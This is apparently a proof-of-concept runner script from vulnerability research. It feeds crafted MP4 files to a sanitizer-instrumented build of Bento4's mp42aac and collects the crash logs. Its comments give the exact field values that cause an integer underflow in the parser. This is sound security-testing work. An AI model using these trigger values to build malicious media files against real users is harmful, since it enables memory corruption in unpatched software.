#!/bin/bash
set -e

POC_DIR="/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4CommandFactory_h"
BINARY="/data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac"
RESULT="$POC_DIR/vuln_002_result.txt"

echo "=== VULN 002 PoC Run: $(date) ===" > "$RESULT"

# Step 1: Generate PoC files
echo "[*] Generating PoC MP4 files..." | tee -a "$RESULT"
python3 "$POC_DIR/vuln_002_gen.py" 2>&1 | tee -a "$RESULT"

# Step 2: Run approach 1 (url_flag=0, payload_size=3)
echo "" | tee -a "$RESULT"
echo "--- Approach 1: url_flag=0, payload_size=3 (3-7=0xFFFFFFFC underflow) ---" | tee -a "$RESULT"
ASAN_OPTIONS="abort_on_error=0:log_path=$POC_DIR/asan_002_a1.log" \
  "$BINARY" "$POC_DIR/vuln_002.mp4" /dev/null \
  >> "$RESULT" 2>&1 || true

# Collect ASAN/UBSAN logs from approach 1
for f in "$POC_DIR"/asan_002_a1.log.*; do
  [ -f "$f" ] && { echo "--- ASAN log: $f ---" >> "$RESULT"; cat "$f" >> "$RESULT"; } || true
done

# Step 3: Run approach 2 (url_flag=1, url_length=255, payload_size=4)
echo "" | tee -a "$RESULT"
echo "--- Approach 2: url_flag=1, url_length=255, payload_size=4 (4-258=0xFFFFFEFE underflow) ---" | tee -a "$RESULT"
ASAN_OPTIONS="abort_on_error=0:log_path=$POC_DIR/asan_002_a2.log" \
  "$BINARY" "$POC_DIR/vuln_002_alt.mp4" /dev/null \
  >> "$RESULT" 2>&1 || true

# Collect ASAN/UBSAN logs from approach 2
for f in "$POC_DIR"/asan_002_a2.log.*; do
  [ -f "$f" ] && { echo "--- ASAN log: $f ---" >> "$RESULT"; cat "$f" >> "$RESULT"; } || true
done

echo "" >> "$RESULT"
echo "=== Run complete ===" >> "$RESULT"
echo "[*] Results written to $RESULT"
